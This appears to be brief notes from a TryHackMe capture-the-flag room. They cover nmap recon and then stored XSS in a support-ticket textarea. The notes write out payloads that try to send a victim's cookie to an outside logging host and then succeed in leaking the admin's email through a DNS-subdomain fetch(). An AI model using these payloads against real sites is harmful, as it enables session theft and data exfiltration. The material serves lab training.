start with nmap.

22
80

http

we can login as well as register.

register as test user.

we can raise ticket. got xss by

`test</textarea><script>alert(1)</script>`

test</textarea><script>document.location=“http://13c47917e8afb90f25b6661b128a4858.log.tryhackme.tech/?c=“+document.cookie;</script><textarea>

not success

may be it has some kind of firewall. lets try another method for grabbing cookies. httponly flag is set.

alert(document.getElementById("email").innerHTML)

```
test</textarea><script>document.location="http://13cadefbdfe3bfbdf06feac1dfe2bc93.log.tryhackme.tech/?c="+document.getElementById("email").innerHTML</script></textarea>

```

</textarea>
<script>
var email = document.getElementById("email").innerHTML;
email = email.replace('@', 'X');
email = email.replace('.', 'Y');
fetch('http://'+ email + '.13cadefbdfe3bfbdf06feac1dfe2bc93.log.tryhackme.tech');
</script>
<textarea>

adminaccount@itsupport.thm